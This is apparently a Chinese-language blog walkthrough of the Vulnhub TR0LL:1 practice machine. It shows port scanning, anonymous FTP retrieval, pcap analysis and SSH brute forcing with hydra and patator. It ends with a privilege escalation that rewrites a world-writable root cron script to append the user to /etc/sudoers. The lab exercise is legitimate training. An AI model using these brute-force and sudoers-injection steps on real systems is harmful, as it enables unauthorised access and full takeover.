---
title: Vulnhub-TR0LL:1 
date: 2024-03-14  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Troll1.html"
---

# TR0LL: 1

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427378.png" alt="image-20240314122855778" style="zoom:50%;" />

尝试扫描一下：

```text
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.161.61.1     00:50:56:c0:00:08       (Unknown)
10.161.61.2     00:50:56:f8:9d:56       (Unknown)
10.161.61.132   00:0c:29:7f:02:cf       (Unknown)
10.161.61.254   00:50:56:e4:42:fb       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.113 seconds (121.15 hosts/sec). 4 responded
```

扫出来了，开始进行攻击！

## 信息搜集

```bash
rustscan -a 10.161.61.132 -- -A -sV -Pn
```

```text
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.161.61.132:21
Open 10.161.61.132:22
Open 10.161.61.132:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 00:35 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 00:35
Completed Parallel DNS resolution of 1 host. at 00:35, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:35
Scanning 10.161.61.132 [3 ports]
Discovered open port 21/tcp on 10.161.61.132
Discovered open port 22/tcp on 10.161.61.132
Discovered open port 80/tcp on 10.161.61.132
Completed Connect Scan at 00:35, 0.00s elapsed (3 total ports)
Initiating Service scan at 00:35
Scanning 3 services on 10.161.61.132
Completed Service scan at 00:35, 6.05s elapsed (3 services on 1 host)
NSE: Script scanning 10.161.61.132.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:35
NSE: [ftp-bounce 10.161.61.132:21] PORT response: 500 Illegal PORT command.
Completed NSE at 00:35, 0.53s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
Nmap scan report for 10.161.61.132
Host is up, received user-set (0.00093s latency).
Scanned at 2024-03-14 00:35:22 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.161.61.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPvm+E+qXyRODHZMbgiT5buFG3ibhNm4hBA3oWrF0kIpePfc0uQZIPUpUZG6EEGQjbeXhyMFPQu4P9s6QwJJ4f31K+U+dLmMfOJNaIVdx9MpX04xuy7mxDp7h9XDJPiIcgLvMYItY52kgxZAuFbjsYdyBBT48Umyd6hhCpwq1/0rAAAAFQDFm+k8NFmBftv1yK4U7dkg8ERgVwAAAIEAzzz/FseGlWcEZrnlJSMoyKRa/Dph5uIYpYqLu1OfZLhPKnELg9l5w6Gct9D+5SrFnm5lX6IcHWhG/4ionh9qQO/IJtuuSia9nVHruLvYipqiyULQ/HO69Znv7hGmsWAsQa3MlX7nyo/0MSgmVIJraSUBBNBzLCgU5oLn0xxNirwAAACARTIMgZBYWhbs2aZeqfq4HjUzH1nUB+/bvyJ4cmbc3s8VfZhXRUggjDiz3f3spROVZEKwBKLUSM/lGIDd9LfUjtjdoKdYN1HDEUwiKl2OlbmnhNX88NCF1QN66XTYKq0CThJYinBMIZi8FiW4DYZ9QT+9SZDib6hEvab/E7YJ9zY=
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDi1MPWZMtN3eywmC1nj8ZOZsCv7j78Do5ebJiFEhwXDszJtWgzp/Tb9H/VidiUAdlnzNNZoq6KSBqETX1SxaHyl+d28gHR0A7Y1U0BtkMjTQsqo+Ocpc1cUSdAZTGz8i7t/segL8ouF7agOjr0x97R5Hw1BSYuK3u51qgCothfrKJFrtt4mPryqx6Q2+ZV5h3dOaMExprApTMCjj2WtKwJn5xZsmKJ5c8sVnsbQaNKo1M7IH2WJkV89jO90EMZ6XJsTlbobWN8pASn7N05rjvI/njinfI8cUq9HdSjYjaM4Lq4ZpReNXQ3bf7da0nRRGv2tSaVGU7OhcpNYIpo7Xcv
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE+5luyzp+tLU9TK+5Avd2IA+8LEBFPxjUavwPVbeLdBhgF/pTThnzpQ2hEhcUzWq2CfQPkg6q4H4F9k9Tpeg+k=
|   256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIJZC+1mSO4wMlWhDBBwmHKkCob1KrCwkoqIvi9Bw+44
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:35
Completed NSE at 00:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds

```

## 目录扫描

开启了80端口，尝试目录扫描：

![image-20240314123711634](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427380.png)

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.161.61.132 -f -t 200
```

```text
/icons/               (Status: 403) [Size: 286]
/secret/              (Status: 200) [Size: 37]
/server-status/       (Status: 403) [Size: 294]
```

## 漏洞利用

### 敏感目录分析

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427381.png" alt="image-20240314124728567" style="zoom:50%;" />

看一下`/secret`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427382.png" alt="image-20240314124352690" style="zoom: 33%;" />

等下做不出来，可以尝试下载一下文件分析是否有包含。

### FTP连接

```bash
ftp 10.161.61.132
```

显示需要验证，看看前面的`nmap`扫描结果：

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

尝试登录：

```text
Connected to 10.161.61.132.
220 (vsFTPd 3.0.2)
Name (10.161.61.132:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||13804|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
229 Entering Extended Passive Mode (|||29147|).
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
100% |***********************************************************************************************|  8068        4.41 MiB/s    00:00 ETA
226 Transfer complete.
8068 bytes received in 00:00 (2.96 MiB/s)
ftp> exit
221 Goodbye.
```

### wireshark分析

打开`wireshark`分析一下，追踪TCP流：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427383.png" alt="image-20240314125223581" style="zoom:33%;" />

还发现了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427384.png" alt="image-20240314125642918" style="zoom:50%;" />

### 敏感目录访问

尝试一下，找到的两个文件，看看能不能访问到：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427385.png" alt="image-20240314125841639" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427386.png" alt="image-20240314130000535" style="zoom:33%;" />

### 查看下载文件

![image-20240314130116427](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427387.png)

查看一下字符串：

```bash
strings roflmao
```

```text
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Find address 0x0856BF to proceed           //疑似敏感地址！
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6590
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
roflmao.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
_edata
_fini
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init
```

访问一下地址`0x0856BF`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427388.png" alt="image-20240314130320440" style="zoom:50%;" />

查看一下相关信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427389.png" alt="image-20240314130400127" style="zoom:33%;" />

```text
//which_one_lol.txt	
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427390.png" alt="image-20240314132501149" style="zoom: 33%;" />

```text
//Pass.txt
Good_job_:)
```

### 九头蛇爆破

```bash
hydra -l which_one_lol.txt -P Pass.txt -t 6 -s 20000 ssh://10.161.61.132
```

未爆破出来，但是稳住！尝试换一个工具，hydra不争气好几次了，害。

```bash
patator ssh_login host=10.161.61.132 user=FILE0 0=which_one_lol.txt password=Pass.txt
```

```text
01:37:03 patator    INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.11.7 at 2024-03-14 01:37 EDT
01:37:03 patator    INFO -                                                                              
01:37:03 patator    INFO - code  size    time | candidate                          |   num | mesg
01:37:03 patator    INFO - -----------------------------------------------------------------------------
01:37:05 patator    INFO - 1     22     2.046 | ps-aux                             |     2 | Authentication failed.
01:37:05 patator    INFO - 1     22     2.034 | felux                              |     3 | Authentication failed.
01:37:05 patator    INFO - 1     22     2.044 | Eagle11                            |     4 | Authentication failed.
01:37:05 patator    INFO - 1     22     2.044 | blawrg                             |     7 | Authentication failed.
01:37:05 patator    INFO - 1     22     2.036 | wytshadow                          |     8 | Authentication failed.
01:37:05 patator    INFO - 1     22     2.020 | vis1t0r                            |     9 | Authentication failed.
01:37:05 patator    INFO - 0     39     2.069 | overflow                           |    10 | SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
01:37:07 patator    INFO - 1     22     3.928 | maleus                             |     1 | Authentication failed.
01:37:07 patator    INFO - 1     22     3.878 | genphlux < -- Definitely not this one |     5 | Authentication failed.
01:37:07 patator    INFO - 1     22     3.927 | usmc8892                           |     6 | Authentication failed.
01:37:08 patator    INFO - Hits/Done/Skip/Fail/Size: 10/10/0/0/10, Avg: 2 r/s, Time: 0h 0m 4s
```

看来`overflow`是一个可行的用户。

### ssh连接

```bash
ssh overflow@10.161.61.132
password:Good_job_:)
```

不正确？？？？wtm！难道用户名也是密码？爆破一下试试：

```bash
hydra -s 22 -v -V -l overflow -P which_one_lol.txt -e n -t 1 -w 30 10.161.61.132 ssh
```

```text
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "" - 1 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "maleus" - 2 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "ps-aux" - 3 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "felux" - 4 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "Eagle11" - 5 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "genphlux < -- Definitely not this one" - 6 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "usmc8892" - 7 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "blawrg" - 8 of 11 [child 0] (0/0)
[STATUS] 8.00 tries/min, 8 tries in 00:01h, 3 to do in 00:01h, 1 active
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "wytshadow" - 9 of 11 [child 0] (0/0)
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "vis1t0r" - 10 of 11 [child 0] (0/0)
[STATUS] 5.00 tries/min, 10 tries in 00:02h, 1 to do in 00:01h, 1 active
[ATTEMPT] target 10.161.61.132 - login "overflow" - pass "overflow" - 11 of 11 [child 0] (0/0)
[STATUS] attack finished for 10.161.61.132 (waiting for children to complete tests)
1 of 1 target completed, 0 valid password found
```

`genphlux`没有试，试一下。。。。错的。。。。

再找一下是否有遗漏的信息：

作者提示了`this_folder_contains_the_password/`说明这个文件夹下是有正确的密码的！把这个文件名和`Pass.txt`放入一个文件，再次爆破。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427391.png" alt="image-20240314134943698" style="zoom:50%;" />

嘶。。。。拿下！！

连接一下：

```bash
┌──(kali㉿kali)-[~/temp]
└─$ ssh overflow@10.161.61.132
overflow@10.161.61.132's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.7 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
```

## 提权

这种机子比较老了，就不尝试内核漏洞了，看看有没有别的思路：

### 查看一下suid

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/su
/bin/ping
/bin/fusermount
/bin/ping6
/bin/mount
/bin/umount
```

似乎没有我们可以直接利用的。

### 查看定时任务

```bash
crontab -l
ls -alh /var/spool/cron
cat /var/spool/cron/crontabs/root
```

一无所获。。

查看一下常见目录，看看有没有收获，没有什么发现，在我发呆的时候突然弹出来这个个等下：

```bash
Broadcast Message from root@trol                                               
        (somewhere) at 22:50 ...                                               
                                                                               
TIMES UP LOL!                                                                  
                                                                               
Connection to 10.161.61.132 closed by remote host.
Connection to 10.161.61.132 closed.
```

嘶。。。。看来还是有定时任务的，淦！

查看一下日志：

![image-20240314140157807](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427392.png)

找到元凶了！！！2分钟运行一次的定时任务！

先找一下位置：

```bash
find / -name cleaner.py 2>/dev/null | grep "cleaner.py"
# /lib/log/cleaner.py
```

```python
# /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

查看一下这个文件的权限：

```bash
$ ls -l /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
```

好样的，写一下，改为：

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "overflow ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```

编辑的时候显示有`swap`文件存在，给它删掉就行了，`vim`编辑后`wq!`强制保存退出，等待把我们踢出去，再重新进即可：

![image-20240314141741968](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427393.png)

前面忘记加声明了，加一下：

![image-20240314142310714](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427394.png)

然后即可获取到了root，看似不是root其实权限已经和root一样了！！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403141427395.png" alt="image-20240314142646737" style="zoom:50%;" />

最后成功获取flag！！！！

#### 补充

能写python文件代表着甚至可以直接读取flag，或者将ssh公钥丢进去也可以！！！